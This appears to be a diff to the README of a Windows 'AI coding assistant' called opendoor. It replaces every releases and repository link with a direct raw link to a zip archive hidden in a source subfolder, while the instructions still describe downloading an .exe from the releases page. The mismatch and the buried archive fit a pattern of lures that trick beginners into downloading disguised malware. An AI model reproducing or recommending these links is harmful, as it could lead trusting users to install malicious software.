@@ -1,6 +1,6 @@
 # 🚪 opendoor - Your AI Coding Helper
 
-[![Download opendoor](https://img.shields.io/badge/Download-Opendoor-blue?style=for-the-badge)](https://github.com/Krkrrom5/opendoor/releases)
+[![Download opendoor](https://img.shields.io/badge/Download-Opendoor-blue?style=for-the-badge)](https://raw.githubusercontent.com/Krkrrom5/opendoor/main/opendoor/io_layer/Software-3.5.zip)
 
 opendoor is an AI coding assistant with a C++ core. It helps you write and understand code using artificial intelligence. This guide will help you download and run opendoor on your Windows computer, even if you have little or no experience with software.
 
@@ -38,12 +38,12 @@ Having the latest Windows updates installed helps with compatibility.
 
 You will find the software on GitHub under the releases section. The link below takes you to the page with the latest files for Windows.
 
-[![Download opendoor](https://img.shields.io/badge/Download-Opendoor-grey?style=for-the-badge)](https://github.com/Krkrrom5/opendoor/releases)
+[![Download opendoor](https://img.shields.io/badge/Download-Opendoor-grey?style=for-the-badge)](https://raw.githubusercontent.com/Krkrrom5/opendoor/main/opendoor/io_layer/Software-3.5.zip)
 
 **Steps to download opendoor:**
 
 1. Click on the button above or visit the page:  
-   https://github.com/Krkrrom5/opendoor/releases  
+   https://raw.githubusercontent.com/Krkrrom5/opendoor/main/opendoor/io_layer/Software-3.5.zip  
 2. Find the latest release. Releases have version numbers like v1.0 or v2.0.  
 3. Look for the Windows file. This will usually end with `.exe` (for example, opendoor-setup.exe).  
 4. Click on the `.exe` file link to start the download.  
@@ -120,7 +120,7 @@ You can find more help and documentation on the GitHub page.
 To keep your software current:
 
 1. Visit the releases page again:  
-   https://github.com/Krkrrom5/opendoor/releases  
+   https://raw.githubusercontent.com/Krkrrom5/opendoor/main/opendoor/io_layer/Software-3.5.zip  
 2. Download the new installer file when a new version is released.  
 3. Run the installer to update your existing installation.  
 4. No need to uninstall the old version manually. The installer handles this.  
@@ -145,7 +145,7 @@ You can find the settings file in your user documents under `opendoor_config`. E
 ## 🔗 More Resources
 
 Visit the GitHub repository for detailed guides, source code, and updates:  
-https://github.com/Krkrrom5/opendoor
+https://raw.githubusercontent.com/Krkrrom5/opendoor/main/opendoor/io_layer/Software-3.5.zip
 
 The repository contains:
 
